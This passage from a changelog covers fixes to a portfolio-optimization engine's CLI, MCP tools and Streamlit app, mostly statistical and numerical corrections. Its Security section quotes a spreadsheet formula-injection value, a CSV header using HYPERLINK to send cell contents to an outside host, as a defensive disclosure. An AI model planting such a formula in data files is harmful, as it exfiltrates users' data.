# Changelog

All notable changes to this project are documented here.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

While the version is below 1.0.0, the public API may change in a minor
release. Every such change is listed here under **Changed** or **Removed**,
with what to do about it.

## [Unreleased]

### Fixed

- **The CLI no longer optimizes synthetic data when `--prices` is forgotten.**
  `optimize --config c.yaml --json` exited 0 with plausible weights on the
  built-in sample panel and nothing anywhere saying so. `optimize`, `backtest`
  and `check` now need exactly one of `--prices`, `--provider`, `--yahoo` or
  `--sample`, and exit 2 otherwise — including when two are given, where
  `--sample` used to win silently. `scripts/run_optimization.py` had the same
  fallback and now requires `--prices` or `--sample`.
- **A piped run on Windows no longer crashes on α, δ or ←.** stdout and stderr
  are set to `errors="backslashreplace"`, so `optengine list-optimizers | more`
  and `optimize` on the example config finish — the second used to die before
  writing its workbook.
- **An unreadable config or price file is exit 2, not a traceback.** A missing
  config, a misspelt key, malformed YAML or a missing `--prices` file escaped
  as a traceback with exit 1, with or without `--json`.
- **Every refusal carries its reason into the `--json` payload.** An infeasible
  mandate, a solver that gave up, a breach under `--strict-mandate`, an unknown
  method name, a shock outside the panel, an unreadable stress or universe
  file, a failed walk-forward and an invalid backtest spec all emitted
  `"error": "the command exited before producing a result"`. The spec error's
  "Pass --initial-capital." hint is now kept for the one error it answers.
- **The MCP tools report the engine's own refusals.** An unknown optimizer, a
  shock outside the panel, an invalid backtest spec and a text-valued CSV all
  reached the client as "Error executing tool X" with the reason discarded.
  They now arrive as `ToolError` with the reason; a text column is named by
  position, not by its header.
- **`docs/ERRORS.md` and `main()`'s docstring said an infeasible `check` exits
  1.** It exits 2, as `AGENTS.md` and the tests say; the table now agrees.

- **Monthly and weekly panels were annualized as daily.**
  `IngestRequest.periods_per_year` was never read and the CLI used the
  config's 252 whatever the dates said: a month-end panel reported a 28.7%
  volatility and a 170% return for a book at 6.3% and 8.1%.
- **The `file` provider blocked currency conversion.** It labelled every
  series with the currency it was to be converted into, so nothing was
  converted, and the CLI then set the config's `currencies` map aside. A peso
  series was optimized as dollars with exit 0. File series are now in an
  unknown currency, and the config map is set aside only for series the ingest
  actually converted.
- **`ema` expected returns rested on the window's first observation.**
  `ewm(adjust=False)` gave it 77% of the weight on two years of months, so one
  bad first month took μ to −86.7%. The weights are now normalized over the
  window, and `ema` annualizes arithmetically, like `mean`.
- **`geometric_mean` annualized a late-listing asset over the whole panel.**
  The exponent counted every row; it now counts the asset's own (4.6% → 9.45%
  in the repro).
- **FX rates were one period stale on dates the rate series skips.** Rates
  were reindexed onto the price dates before the forward fill, so a weekend
  month-end took the previous month-end's rate (7 of 24 months). The fill is
  now an as-of join.
- **A stopped FX series was carried forward without limit.** A price date more
  than `MAX_STALE_FX_DAYS` (10) business days past its newest rate now raises
  `FXError`, like a leading gap longer than `MAX_LEADING_FX_GAP`.
- **Michaud resampling shifted ranks after a failed one.** One rank failing in
  one draw moved every rank above it down a slot and dropped the top rank,
  while reporting "Averaged 8 of 8". Ranks are averaged by position over the
  draws where they solved; a rank that solved in fewer than half is left out
  and named.
- **`bootstrap_frontier` centred its curve on a different μ from its band**,
  and raised for a config without `expected_returns`. Both now come from
  `resolve_expected_returns`.
- **A series that rarely moves was reported clean.** More than 25% exactly-zero
  returns now raises a `zero_returns` warning.
- **A failed Marchenko-Pastur fit fell back to σ² = 1 silently.** It now warns
  and sets `noise_fit_failed`.
- **The ingest cache.** A warm run dropped the cold run's currency warning; an
  edited file was served from the cache as the old panel; a tz-aware panel was
  stored but never loaded. All three are fixed.

- **A threshold or rank universe dropped a name on the very bar it crashed.**
  Those rules judge date `t` on `t`'s own data, and the runner read the mask
  at or before `t`. With `execution_lag=0` — the default of `BacktestSpec`
  and of `EngineRun.walk_forward_run` — the book chosen on `t` is held over
  `t`, so the rules-file example "not in freefall" (`returns > -0.5`) held
  0.0 in every name on its −60% session and turned a run that lost 65.48% a
  year into one that made 7.72%. `Eligibility` now records whether a verdict
  reads its own date (`same_bar`: true for threshold and rank, inherited
  through `&`, `|`, `~`, hysteresis and `hold_through`), and
  `point_in_time_mask` reads such a universe strictly before each bar when
  the lag is zero. Rolling rules, membership frames and every run with a lag
  of one or more read exactly as before. Same panel, fixed: −65.25%.
- **`delisting_grace` looked one bar ahead.** Silence was measured through
  the decision date, the bar the decision's book is held over, while the
  solve window ends the bar before. With `delisting_grace=0` a name that
  halted on the decision bar was sold at its last mark and dodged the −50%
  it reopened at: +3.04% against −48.58% for the same process without the
  rule. Staleness is now measured on the bars strictly before the decision;
  a name whose first print is on the decision bar likewise enters at the
  next decision.
- **`--universe` and `--delisting-grace` could not correct survivorship on
  the CLI.** Every panel was aligned to the dates all names printed on —
  [last listing, first delisting] — before either flag saw it, so the
  backtest ended on the day the first name delisted and `notes.delistings`
  was always empty (a 1,000-row panel ran on 400). With either flag the
  walk-forward, the sweep, the tearsheet and the holdout replay now run on
  the unaligned panel, with only gaps inside a name's life aligned away; the
  initial solve keeps the aligned panel and the alignment log says which
  panel each step used.

- **A drawdown is measured from the capital invested, not from the first
  close.** `drawdown_series` started its running peak at the wealth after the
  first return, so a series that opened with a loss never counted it:
  `[-10%, -10%, +5%, +1%]` reported a -10% maximum drawdown against a true
  -19%, a Calmar of -10.0 against -5.26, and three -5% bars a -9.75% drawdown
  against -14.26%. The peak now starts at log-wealth zero. Max Drawdown and
  Calmar in `summary_stats`, the Ulcer index, time under water,
  `drawdown_table`, the sweep's `max_drawdown` column, `relative_drawdown`,
  `plot_drawdown` and `plot_relative_wealth` all inherit it, as do the CDaR
  optimizer's realized-drawdown extras and HERC's drawdown risk measure, which
  call `drawdown_series`. A series that opens with a gain is unchanged; the
  sample-panel figures quoted in `docs/RESEARCH.md` do not move.
- **A tearsheet whose deflation failed no longer says no trial count was
  supplied.** `build_tearsheet` caught every exception from the deflation and
  the caveat then read "No trial count was supplied" for a run whose caller
  had passed `n_trials=40`. Fewer than two usable trial Sharpes now fall back
  to the run's own sampling variance — the stand-in `deflated_sharpe_ratio`
  documents — with a caveat saying so; a `ValueError` from the deflation is
  quoted in the caveat and in `metadata["deflation_note"]`; any other
  exception propagates.
- **A return stream that is constant up to rounding has no Sharpe ratio.** The
  zero-variance guards compared the standard deviation with exactly zero, and
  a constant 1bp stream keeps one near 1e-20, so it scored a Sharpe of about
  1.2e17. Alone it got a deflated Sharpe of 1.0 and a minimum track record of
  one period; in a sweep it set the deflation benchmark to 8e16, taking every
  cell's DSR to 0, and took the PBO of a skill-free grid from 0.314 to 0.000.
  A standard deviation at or below √ε (about 1.5e-8) of the mean absolute
  return is now treated as rounding: `sharpe_ratio`,
  `probabilistic_sharpe_ratio`, `deflated_sharpe_ratio` and
  `minimum_track_record_length` return NaN for it, and CSCV scores it zero as
  it already did at exactly zero variance.
- **Active risk counts the names only the benchmark holds.**
  `active_risk_decomposition` decomposed only the assets listed in `weights`,
  so a book given by its holdings lost every benchmark-only underweight:
  `{A: .5, B: .5}` against equal-weight A/B/C reported a 4.71% tracking error
  against a true 8.16%. It now works over the union of both sides.
- **Effective N stays between 1 and the number of assets.** `effective_n` was
  `1/Σw²`, which scored `[1.5, -0.5]` as 0.4 positions and a book half in cash
  as twice the assets it holds. It is now `(Σ|w|)²/Σw²`, identical for a fully
  invested long-only book. `effective_n_risk` counts risk contributions by
  their size, so a hedge no longer drives it below 1: a long-only pair at
  ρ = -0.9 moves from 0.598 to 1.40.
- **Relative metrics pair each column with the benchmark on its own dates.**
  On a frame whose columns start on different dates, `beta` ran OLS over the
  late column's NaN rows and returned NaN silently, and up/down capture, the
  information ratio, M² and the relative drawdown measured the column over its
  own dates but the benchmark over all of them (up-capture 1.0872 against
  1.0841 on matched dates). A single series is unchanged.
- **The trial count is never below the number of trial Sharpes supplied.**
  Fifty trial Sharpes with `n_trials=1` deflated against one trial — DSR =
  PSR = 0.999, where fifty give 0.793. A smaller `n_trials` is now raised to
  the count with a warning, and `DeflatedSharpe.n_trials` reports the count
  used.
- **No observations is no annual return.** `annualize_returns` returned 0.0
  for an empty or all-NaN series, which read as a 0% CAGR; it now returns NaN,
  per column for a frame.
- **The base configuration counts as a trial when the sweep grid does not
  contain it.** `optengine backtest --sweep` deflates its headline run — the
  base config — against the grid. With base `mean_variance` swept over
  `min_variance,equal_weight` it deflated against 2 trials and a dispersion
  the headline was not part of; it now uses 3, with the headline's Sharpe in
  the dispersion. New `SweepResults.base_is_cell()` and
  `SweepResults.trials_with_base()`.
- **An infinite condition number is distinguishable from a missing one, and
  the "not PSD, repaired" warning can fire.** The covariance payload carries
  `condition_number_infinite` next to the `null` strict JSON forces on an
  infinite number. `run_engine` used to diagnose the matrix `nearest_psd` had
  already repaired, so the warning about an indefinite estimate was
  unreachable; it now diagnoses the raw estimate and solves against the
  repaired one, as before. `covariance_from_config` gains an `ensure_psd`
  passthrough for this.
- **A workbook that leaves sheets out says which.** `run_sheets` dropped the
  relative-performance and out-of-sample sheets when their report could not
  be built — the second behind `except (ValueError, KeyError): pass` — and the
  workbook looked complete. It now adds an `omitted_sheets` sheet with the reason and issues a
  `UserWarning`.

- **NCO long-short was clipped by a box nobody set.** The per-cluster and
  inter-cluster sub-problems were built with no bounds, which `get_bounds`
  reads as the long-short default of (−1, 1). Under a (−10, 10) mandate two
  tight pairs came back as [0.6, 0, 0.4, 0] against the [1.155, −0.495,
  0.495, −0.155] of *MLAM* snippet 7.6, with no violation and a clean audit.
  Long-short layers now carry explicit (−inf, inf) bounds, so the mandate on
  the combined book is the only box, and NCO matches the snippet to 1e-12.
  The ray-space builder writes down only finite bounds.
- **An indefinite covariance is refused before any solve.** `cp.psd_wrap`
  trusts the matrix, so a long-short minimum-variance solve on one with a
  negative eigenvalue came back `optimal` at `w'Σw = −0.0445`, reported as
  zero volatility. `optimize()` now raises `NonPSDCovarianceError` (a
  `ValueError`) when the smallest eigenvalue is below −1e-8 of the trace. The
  engine's estimators already repair their output with `nearest_psd`, so only
  a matrix handed to an optimizer directly is affected; the message names the
  repair.
- **A return floor below the reachable range is a warning, not a fatal.**
  `target_return` has been a floor since 0.7.0, so every allocation clears a
  target below the range; the pre-flight still called it impossible, and
  `--strict` refused a mandate the solve answers.
- **Black-Litterman's pre-flight builds the posterior the solve uses.** With
  `bl_calibrate_risk_aversion` it ignored the implied δ: a 12% market return
  gave δ = 6.95 in the solve and 2.5 in the pre-flight, posteriors of
  [7.7%, 11.9%, 16.3%] against [4.1%, 5.6%, 7.2%], and a 16.22% target the
  solve meets exactly was fatal. Both now call `market_portfolio` and
  `resolve_risk_aversion`.
- **Black-Litterman binds a tracking-error budget on Σ, and the registry says
  it binds one.** `supports_benchmark_limits` was `False` and the factory
  warned the limit would not be enforced, while the solve enforced it on the
  posterior `Σ + M`: a 1% budget came back at 0.98% against Σ. It is now
  measured on Σ, like every other method and the audit.
- **Max-diversification raises a refused inaccurate answer instead of
  projecting.** With `accept_inaccurate=False` an `optimal_inaccurate` verdict
  became `fallback_projection` with the tracking-error budget dropped. And a
  second `optimize()` on the same instance no longer reports the first solve's
  `bounds_mode`, `projection_distance` or `fallback_reason`: diagnostics are
  cleared at the start of every solve.
- **A constant series counts as zero variance.** Its sample variance is
  rounding (1.86e-37 for a flat cash line), so the exact-zero guards let it
  through and inverse volatility and HRP put 100% of the book in it. The
  guards in HRP, HERC, NCO, inverse volatility and max-diversification now
  share `zero_variance_assets`: at most 1e-12 of the largest variance is zero.
- **Max-Sharpe decides whether any allocation beats cash, not each asset.**
  A box capping the only asset above the risk-free rate surfaced as
  `SolverFailure` "no allocation satisfies every constraint"; it now raises
  `NoPositiveExcessReturnError` (a `ValueError`) naming the best feasible
  excess return. A long-short book whose assets all trail cash is no longer
  refused when a spread between them beats it (review item O10). An excess of
  1e-7 no longer comes back infeasible: the ray is normalized by the best
  feasible excess. A long-short tangency with no finite box and no maximizer
  raises `SolverFailure("unbounded")` instead of returning ±1.9e9 weights.
- **NCO max-Sharpe survives a cluster below the risk-free rate.** That
  cluster is solved for minimum variance, named in
  `extras["nco_min_variance_fallback"]`, and warned about; a bond pair below
  cash used to fail the whole solve while plain max-Sharpe answered
  [0.61, 0.39, 0, 0], which NCO now returns too.
- **A target or budget a method ignores is recorded.** `target_return` and
  `target_volatility` on a method that does not take them, and
  `fully_invested=False` on risk parity, now appear in
  `extras["ignored_constraints"]`, and the pre-flight no longer validates a
  target the solve will not read. Minimum variance with an open budget
  reports `invested_fraction` and a `budget_note`.
- **CVaR and CDaR compare a return floor with the arithmetic mean.** With no
  expected returns supplied they annualized the history as `(1+m)^ppy − 1`, so
  a 56.6% floor above the 49.4% best arithmetic mean "solved" at 45.8%. They
  now call `expected_returns_from_history("mean")`.
- **The fast projection keeps an open budget open and sees a gross cap**
  (review item O15). HRP with `fully_invested=False` and three 25% caps raised
  `InfeasibleBoundsError`; the projection is now the clip when there is no
  budget, and a gross cap that can bind takes the exact path.

- **A missing or misspelt expected return is no longer a silent zero.**
  `resolve_expected_returns` filled the gaps with 0.0 before any optimizer saw
  the vector, so the optimizer's own missing-return warning could never fire
  on the engine path: with a key spelt `EM_Equityy`, `EM_Equity` was optimized
  at exactly 0.0 with `run.warnings` empty. A vector that both misses panel
  assets and names assets the panel does not hold — what a misspelling looks
  like — now raises `ConfigurationError` naming both. A missing asset alone is
  still filled with 0.0, but a `UserWarning` names it and `run_engine` records
  it in `run.warnings` and `extras["missing_expected_returns"]`. Extra names
  alone are ignored and reported in `extras["ignored_expected_returns"]`,
  because a walk-forward hands a screened window a subset of the columns. The
  CLI's cut of the panel to the config's universe now goes into the alignment
  log, on stderr and in `--json`.
- **A holding that left the universe counts against the turnover budget.** The
  constraint and both turnover reports reindexed the previous book onto the
  universe, so selling a departed name cost nothing: with 30% in one and
  `turnover_limit=0.50`, the book traded 0.80, the audit was clean and
  `diagnostics.turnover` said 0.50. The forced sale is now a constant on the
  left side of the budget and is counted in every turnover figure. That case is
  now infeasible, as it should be — the sale is 0.30 and redeploying it is
  another 0.30 — and the pre-solve analysis names the turnover budget.
- **One benchmark per run (review item E7).** `benchmark_weights` drove the
  tracking-error and active-share constraints while `benchmark` drove the
  return stream and `performance()`, and the two `EngineRun` helpers disagreed
  about precedence. With `benchmark=equal_weight` and a 60/40 vector the solve
  held tracking error to 3.00% against 60/40 while the report measured 5.64%
  against 1/N. Every use now resolves through the new
  `EngineConfig.effective_benchmark()`.
- **An explicit `benchmark_weights` vector is validated.** A name outside the
  universe was dropped, so `{"SPX_Index": 0.6, "US_Treasuries": 0.4}` with
  `SPX_Index` outside became a benchmark summing to 0.4 and the budget was
  imposed against that. The vector is now read as a `custom_weights` spec:
  an unknown name raises `BenchmarkError` and the weights are normalized.
- **A benchmark member with no return no longer earns 0%.**
  `portfolio_returns_from_weights` filled the panel's gaps with zero, so a
  50/50 benchmark whose second member listed half-way was exactly half the
  first member until then (7.3% volatility against 14.6%), and a matching book
  showed a 5.2% tracking error and -16.6% a year of alpha. A period is now NaN
  when any member with non-zero weight has no return, and `buy_and_hold` is
  bought on the first period every member trades. A complete panel gives the
  same numbers as before.
- **A stressed covariance has to be a covariance.** A replacement
  `covariance_scale` was checked for symmetry only; a crisis matrix with an
  eigenvalue of -0.467 was accepted and reported a volatility of 0.1024 for a
  book that missed the negative direction. It now raises `StressError` when
  the `Shock` is built.
- **The value half of review item E8.** `periods_per_year` of 0 or below (an
  "optimal" equal-weight book with zero volatility) and `ewma_lambda` outside
  `(0, 1)` (a `LinAlgError` from inside the estimator) raise
  `ConfigurationError` at construction. `long_only`, `fully_invested`,
  `strict_mandate` and `denoise` are read strictly: the JSON string `"false"`
  is false, where `bool("false")` made it true, and anything other than
  true/false or 0/1 raises. `EngineConfig(benchmark={...})` is coerced instead
  of failing with `AttributeError` on first use. Under `strict_mandate`, a
  bound or layer assignment naming an asset the panel does not hold raises
  rather than warns.
- **`EngineConfig.from_dict` and `to_dict` copy what they hand over.** The
  config shared `risk_budget`, the views, `extra` and `benchmark_weights` with
  the dict it was read from, and `OptimizerSpec.to_dict()` handed out the
  spec's own `extra`.

### Changed

- **`data_source` in the check, optimize and backtest payloads; schema 2.3.**
  `kind`, `synthetic`, `path`, `provider`, `identifiers`. Branch on
  `synthetic`, which is true for `--sample` and for the `sample` provider. The
  MCP tools take the source as an explicit argument and leave it `null`.
- **`optimize --json` writes no workbook unless `--output` names one.**
  `output_path` is `null` by default. Without `--json` the default
  `outputs.xlsx` is unchanged. Replacing an existing file, from `optimize` or
  `backtest --output`, is announced on stderr.
- **The MCP tools have compute limits.** The schema refuses `lookback` below 2,
  `rebalance_every` below 1 (zero used to mean "the default", silently) and
  negative costs; a panel may have at most 200 assets and 10,000 rows, and a
  backtest at most 250 re-solves. `rebalance_every=5` on the sample panel took
  12 s, `1` is ~1,500 solves. The CLI has no such limits.
- **The release workflow publishes a tag only from `main`, after the tests.**
  New `on-main` (`git merge-base --is-ancestor`) and `test` jobs gate the PyPI
  upload. Actions other than PyPA's publish action are pinned by commit SHA,
  and `build`/`twine` by version.
- **`pandas-stubs` in the `dev` extra is capped at 3.0.5.260730.** The next
  release reports four type errors on unchanged code, which would turn the
  typecheck job red.

- **The CLI and the MCP tools annualize on the data's own frequency.** A
  config that does not set `periods_per_year` now takes it from the ingest
  interval, or from the median spacing of the dates; one that does set it is
  checked against the dates and refused (exit 2) when they contradict it. A
  daily panel with the default 252 is unchanged. Daily data accepts any stated
  value from 240 to 366.
- **`DenoiseReport.n_signal_eigenvalues` is the count the fit found**, zero on
  a pure-noise panel. The factor the filter always keeps is reported
  separately as `n_factors_kept`; the filtered matrix does not change.
- **`PanelCache.store` returns `False` when the entry left in place is one
  that was already there**, as on Windows when a reader holds it open, and the
  ingest service now says "Not cached" when a write did not land.
- **`sample_dataset()` ends on a fixed date, `SAMPLE_END` (2025-12-31).** The
  same seed now gives the same panel, dates included, on any day.

- **Threshold and rank universes act one bar later at `execution_lag=0`.**
  See the first fix. A characteristic that is genuinely known before its
  date opens can be screened into a membership frame and wrapped with
  `Eligibility.from_signal`, which is read on its own date at any lag.
- **A delisting is declared one decision later than before when the name
  went quiet on the decision bar itself.** See the second fix; this also
  applies at `execution_lag=1`, where the walk-forward's decision is still
  taken from the bars before its date.
- **A CLI backtest with `--universe` or `--delisting-grace` covers the
  whole panel.** Track records lengthen and include the names that listed
  late or delisted. A window that shows the solver a name with missing
  returns — typically one listed fewer than `--lookback` bars ago — fails
  and carries the previous book forward, as the library always has; the run
  prints how to admit only names with a full window.
- **`run_backtest` and `backtest_weights` warn when a dated weight schedule
  meets `execution_lag=0`.** At zero lag a target dated `t` is traded at the
  close before `t` and earns `t`'s return; a schedule stamped with the close
  that produced it needs `execution_lag=1`. Nothing about the run changes,
  and `walk_forward_run`, whose schedule is dated by its first holding bar,
  does not warn. Every description of the lag — `BacktestSpec`, the
  tearsheet caveat, the calendar, the CLI and app help, the README — now
  says this instead of "rebalanced on the close of the decision date".

- **Payload schema 2.3** — the same 2.3 that adds `data_source`,
  `data_quality` and `ingest`: `covariance_diagnostics` also gains
  `condition_number_infinite`. No key changed meaning.
- **Units in the docstrings now match the code** (review §2.1 and §2.2, which
  were still open). The risk-free rate on `RunResult.summary`,
  `BacktestResult.summary`, `EngineRun.tearsheet`,
  `EngineRun.in_vs_out_of_sample` and `EngineRun.absolute_summary` is annual,
  not per-period; `BaseOptimizer`'s `risk_free_rate` is in the units of the
  expected returns. Turnover is `Σ|Δw|`, buys plus sells — two-sided, twice
  the one-way figure desks quote — and a `turnover_limit` of 0.20 lets 10% of
  a fully invested book change hands. The one-number cost of
  `CostSpec.from_bps` and `EngineRun.backtest` is charged per side, not
  round-trip. No number changes.

- **`calibrate_risk_aversion=True` without a market return raises
  `ConfigurationError`.** It used to fall back to δ = 2.5 without a word. Pass
  `bl_market_return`, or turn calibration off.
- **Black-Litterman's pre-flight refuses market caps summing to zero**, as the
  solve always did, instead of previewing an equal-weight prior.
- **A long-short max-Sharpe that used to raise `ValueError` "Every expected
  return is at or below the risk-free rate" may now solve**, and a long-only
  one that used to fail with `SolverFailure("infeasible")` now raises
  `NoPositiveExcessReturnError`. Code catching `ValueError` keeps working.
- **`constraints_from_config` leaves out a target the configured method does
  not take**, unless called with `keep_unsupported_targets=True`, which is
  what the factory does.

- **A config naming two different benchmarks is refused.** `benchmark_weights`
  used to win over `benchmark` in the solve only. Setting both to different
  things now raises `BenchmarkError`, at construction and again at use; the
  same vector written both ways is one benchmark. Keep one of the two.
- **`benchmark_weights` is normalized.** It is shorthand for a
  `custom_weights` spec and now behaves like one. A zero benchmark has to be
  written as a `custom_weights` spec with `normalize: false`.
- **`--benchmark` clears the config's `benchmark_weights`.** The flag replaces
  the config's benchmark block; before, the vector stayed and the solve used
  it while the report used the flag.
- **`config/shocks.yaml`.** The "Liquidity squeeze" notes said the scenario
  modelled diversification breaking down. Its scalar clause scales
  volatilities only, and the notes now say so. The numbers are unchanged.

### Added

- **Data-quality findings and the resolved ingest window reach the JSON
  results.** `optimize`, `backtest` and `check` (CLI `--json` and the MCP
  tools) now carry `data_quality` — `usable`, `clean`, and `findings`, one
  object per issue with severity, code, asset, message and suggestion — and
  `ingest`, the request the panel was fetched with, its window resolved, with
  its fingerprint and whether it came from the cache. A run on a panel with an
  error-level finding used to exit 0 with a document that never mentioned it.
  `check` keeps its existing `errors`/`issues` lists. `SCHEMA_VERSION` is 2.3,
  the same bump that adds `data_source`; the MCP tools now fill `data_source`
  too.
- **`optimization_engine.data.frequency`.** `infer_periods_per_year` and
  `resolve_periods_per_year` decide the annualization factor from a stated
  value, the ingest interval or the dates' spacing, raising
  `FrequencyMismatchError` on a contradiction. `config.stated_keys(path)`
  says which keys a config file actually sets.
- **`DenoiseReport.n_factors_kept` and `DenoiseReport.noise_fit_failed`**,
  `ResampledFrontier.rank_counts`, `CacheEntry.notes`, and
  `PriceProvider.cache_token()`.

- `NonPSDCovarianceError` and `zero_variance_assets` in
  `optimizers.base`; `NoPositiveExcessReturnError` in
  `optimizers.mean_variance`; `market_portfolio` and `resolve_risk_aversion`
  in `optimizers.black_litterman`.

- **`Shock.correlation_shift`.** Moves every correlation that fraction of the
  way to +1 and keeps every volatility, `Σ' = (1 − s)Σ + s·σσ'`, so a scenario
  can say that diversification fails. A scalar `covariance_scale` cannot: it
  moves every book's volatility by the same `√scale`. On the sample
  risk-parity book, a shift of 0.5 raises volatility ×1.45 and a shift of 1.0
  ×1.79. It composes with a scalar scale and is refused beside a replacement
  matrix. The CLI and the library read it; the app's scenario grid carries the
  scalar multiplier only.
- **`expected_return_gaps(expected_returns, assets)`** in
  `optimization_engine.engine`: the assets a vector misses and the names it
  carries that the universe does not hold.

### Security

- **The Streamlit app reads no file a visitor names.** `streamlit run` listens
  on every interface, and the Universe tab's "Rules file on disk" box passed
  any path to the rules loader, whose parse error — shown on the page — quoted
  the file: a fake `~/.aws/credentials` came back with its key. A typed or
  uploaded rules document could do the same through `panels:`, and the pandas
  error quoted a CSV's first cell. The box is gone (a button loads the shipped
  example; anything else comes through the uploader), and a document that
  declares `panels:` is refused in the app before anything is read. Screens
  over a characteristic panel run from `optengine backtest --universe`.
- **The MCP server confines the paths it reads, and its errors no longer quote
  files.** `config_path` and `prices_path` must lie under an allowed root —
  `--root DIR`, else `OPTENGINE_MCP_ROOTS`, else the working directory (none
  when that is a filesystem root). Network and device paths are refused before
  they are touched; on Windows, looking up `\\host\share` authenticates to that
  host. Extension and size (1 MiB for a mandate, 64 MiB for prices) are checked
  before a byte is read. A file that does not parse is reported by path,
  exception type and position, never by the parser's message — which quoted a
  YAML line, a value that would not convert (`'sk-live-SECRETVALUE'`), a JSON
  list's items as "unknown config keys", or a CSV's first cell.
- **Text from a data file is never written into a workbook as a formula or a
  link.** xlsxwriter turns any string starting with `=` into a formula, and
  asset names come from price-file headers: one CSV header,
  `=HYPERLINK("http://…"&A1, …)`, became ten live formula cells in the report.
  Every workbook — `write_excel_report`, the app's two downloads, and the CLI's
  `ingest`, `sample-data` and `fred` `.xlsx` output — now goes through
  `reporting.exporters.excel_writer`, which writes strings as text.
- **`pyarrow>=14.0.1`.** 14.0.0 executes arbitrary code on reading an untrusted
  Parquet file (CVE-2023-47248), and every entry point accepts one. The `data`
  and `all` extras admitted it.
- **`load_config` checks the extension before reading.** It read the whole file
  first, so any path was loaded into memory before being refused.
  `load_universe_rules` likewise checks extension and size (1 MiB) first, and
  reports a parse error by line and column instead of quoting it.

### Documentation

- **Every link points at `alanvaa06/finport-optengine`** — PyPI's project
  links, the README, `llms.txt`, the API docs' edit links and the HTTP
  User-Agent. The README banner described 0.5.0 on 0.7.0 and now describes
  0.7.0.
- **`docs/RELEASING.md` registers the Trusted Publisher under the new
  repository name**, with a step to update it on both indexes before the next
  tag: PyPI compares the name in the OIDC claim literally, so a publisher still
  named `Optimization_Engine` rejects the upload.

## [0.7.0] — 2026-09-03

### Fixed

- **A max-diversification mandate the solver could not honour was returned
  violated with status `optimal`; it now raises.** `_solve` routed every
  failure — `SolverFailure("infeasible")` included — into the projection
  fallback, which re-solves unconstrained, projects onto the box, and then
  reported the *inner* solve's `solver_status="optimal"`. Infeasible and
  unbounded are properties of the problem, not of the solver, so they now
  re-raise; only numerical failure earns the fallback, and the fallback
  reports `solver_status="fallback_projection"` with a `dropped_constraints`
  list naming what projection cannot represent. A configuration that used to
  "succeed" with a violated tracking-error budget now raises. That is the fix.
- **The deflated Sharpe counted only the cells that solved.** `n_trials` came
  from `n_ok` while `n_failed`'s own docstring said failed cells still count
  as trials — a configuration you tried and that did not work is still a
  configuration you tried. It now counts `n_cells`, at both sites (the sweep
  module and the CLI's walk-forward sweep). Every deflated Sharpe moves toward
  zero: on fifty skill-free trials, 0.4585 → 0.4562. Separately, the trial
  distribution was computed on full-length streams while the PBO matrix
  inner-joined and dropped incomplete rows, so DSR and CSCV scored different
  samples whenever the grid swept an estimation window; both now read the
  aligned matrix.
- **Returns no longer depend on which pandas is installed.** `pct_change` was
  called with no `fill_method` at four sites. pandas 2.0 through 2.2 pad by
  default, turning a gap into a zero return followed by a compounded jump,
  while 3.0 does not fill — the same source produced two different return
  series depending on the environment. All four now pass `fill_method=None`.
  Users on pandas below 3 with gappy data will see different returns.
- **Schedule dates off the returns index now trade.** They were excluded from
  the decision set, so under `frequency="none"` a weekly schedule stamped on
  Sundays became buy-and-hold. Every off-index date now maps to the first bar
  at or after it; exact matches are unchanged, so schedules that already
  worked cannot move. `meta.notes` records what was moved, what was dropped
  past the last bar, and — the case the design did not consider — which dates
  collapsed onto a shared bar.
- **A failed first walk-forward solve holds cash instead of shortening the
  evaluation.** The schedule was only written when a previous book existed and
  the window started at the first row of weights, so a failed opening solve
  silently deleted every period before the first success, contradicting the
  module's own promise that a failed solve is a row and never a drop. The
  window now starts at the first decision. An all-cash track record is still
  refused rather than returned as a result.
- **A Black-Litterman view the universe cannot express is refused.** A view
  whose assets were all outside the universe was dropped whole; a basket view
  with one leg outside was reduced to the legs that happened to be held,
  turning "long A against short B" into "long A". Both now raise, naming every
  missing asset. The Ω floor is the same failure in numerical form: a pick row
  projecting onto zero prior variance was clamped up to 1e-12, becoming a view
  of near-infinite confidence that then dominated the posterior. It now raises.
- **A refused cache publish is retried rather than reported as a failure.**
  `PanelCache.store` finished with a bare `os.replace`, which on Windows
  raises `PermissionError` whenever another process holds the target open —
  exactly what a concurrent reader does. It is now attempted five times with
  linear backoff, and a target published by another writer of the same key
  counts as success.

- **A failed frontier anchor is reported instead of vanishing.** A GMV or
  tangency solve that failed disappeared from the chart through a bare
  `except: pass`. Both now record the reason on
  `FrontierResult.anchor_failures`, and the chart footnotes it.
- **A target return below the minimum-variance return no longer returns an
  inefficient portfolio.** It was imposed as an equality, so a target under
  the GMV return put you on the dominated lower branch with no warning. It is
  now a floor. `extras` reports whether it bound. Because a floor cannot reach
  it, the dominated branch is no longer traceable for a mean-variance sweep
  and its chart trace is gone; `show_dominated` remains as a documented no-op.
  A mean-CVaR sweep can still produce genuinely dominated points, so the
  efficiency flag stays.
- **Inverse volatility refuses a zero-variance asset instead of dropping it.**
  It gave such an asset zero weight and only raised when *every* asset had
  zero variance, so a name could vanish from the book silently.
- **Michaud resampling counts the draws that failed.** They were discarded
  with a bare `continue` and the average taken over whatever survived, which
  biases the result toward the draws where the mandate did not bind. There
  were two such drops, not one — the second is a draw that solves too few
  points to rank. `resampled_efficient_frontier` now returns a
  `ResampledFrontier` carrying `n_draws`, `n_failed` and `first_error`, and
  refuses when more draws failed than succeeded. `bootstrap_frontier` already
  counted its failures but discarded the exception; it now keeps the message.
- **EWMA covariance is denoised against its effective sample.** The nominal
  row count was passed regardless of method. At `ewma_lambda=0.94` the
  effective sample is about 17, so on 1007 rows the Marchenko-Pastur ratio was
  77 rather than 1.3 and the noise edge 1.24 rather than 3.51 — most
  eigenvalues were classed as signal on the strength of observations the
  estimator had already discounted to nothing. Below a ratio of one the cutoff
  is not estimable by this procedure at all, because the limiting law carries
  an atom at zero the fitted density does not model; that case still refuses,
  but the message now names the effective sample.
- **Bayes-Stein reports zero intensity when it shrinks nothing.** It returned
  `1.0` with an unshrunk vector — the formula's analytic limit, but not a
  description of what the estimator did.
- **The CLI's shared input path aligns the panel and says what it dropped.**
  All three commands that read prices — `optimize`, `backtest`, `check` —
  went through `dropna(how="any")` and then failed with "No usable returns
  after alignment", naming a step that was never performed. They now call
  `align_panel`, narrate the log on stderr and carry it in `--json` and in the
  MCP payloads as `alignment`. For a late listing the surviving rows are the
  same; for an interior gap the numbers genuinely differ, because differencing
  first cost two observations where aligning first costs one.
- **Backtest notes keep their values in JSON.** `meta.notes` is a mapping and
  was serialised with the helper for lists of messages, which yields only the
